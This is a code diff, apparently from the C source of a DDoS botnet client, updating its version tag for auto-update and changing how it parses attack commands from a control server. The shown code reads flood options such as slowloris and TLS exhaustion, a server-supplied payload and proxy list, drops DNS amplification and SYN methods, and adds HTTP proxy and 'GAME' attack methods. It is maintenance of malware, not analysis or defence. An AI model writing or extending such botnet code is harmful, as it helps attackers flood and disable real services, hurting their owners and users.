@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.49"
+#define BOT_VERSION_TAG "v4.0.50"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -408,7 +408,6 @@ int main(int argc, char *argv[])
                 atk.fragmentation = (unsigned)json_int(buf, "fragmentation");
                 atk.slowloris = (unsigned)json_int(buf, "slowloris");
                 atk.tls_exhaust = (unsigned)json_int(buf, "tls_exhaust");
-                atk.dns_amp = (unsigned)json_int(buf, "dns_amp");
                 atk.mega_mode = (unsigned)json_int(buf, "mega_mode");
                 /* Server-provided payload (base64) + proxy list */
                 json_str(buf, "payload", atk.payload_b64, sizeof(atk.payload_b64));
@@ -421,14 +420,15 @@ int main(int argc, char *argv[])
                     char *m = atk.method;
                     for (char *p = m; *p; p++)
                         if (*p >= 'a' && *p <= 'z') *p -= 32;
-                    if (!strcmp(m, "TCP") || !strcmp(m, "ACK")) strcpy(m, "SYN");
+                    if (!strcmp(m, "TCP") || !strcmp(m, "ACK")) strcpy(m, "MEGA");
                     else if (!strcmp(m, "HTTPS")) strcpy(m, "HTTP");
                     else if (!strcmp(m, "SLOW")) strcpy(m, "SLOWLORIS");
                     else if (!strcmp(m, "TLS") || !strcmp(m, "SSL")) strcpy(m, "TLS_EXHAUST");
-                    else if (!strcmp(m, "DNS")) strcpy(m, "DNS_AMP");
-                    if (strcmp(m, "UDP") && strcmp(m, "MEGA") && strcmp(m, "SYN") &&
+                    else if (!strcmp(m, "PROXY")) strcpy(m, "HTTP_PROXY");
+                    if (strcmp(m, "UDP") && strcmp(m, "MEGA") &&
                         strcmp(m, "HTTP") && strcmp(m, "SLOWLORIS") &&
-                        strcmp(m, "TLS_EXHAUST") && strcmp(m, "DNS_AMP")) {
+                        strcmp(m, "TLS_EXHAUST") && strcmp(m, "HTTP_PROXY") &&
+                        strcmp(m, "GAME")) {
                         if (foreground)
                             fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
                         continue;
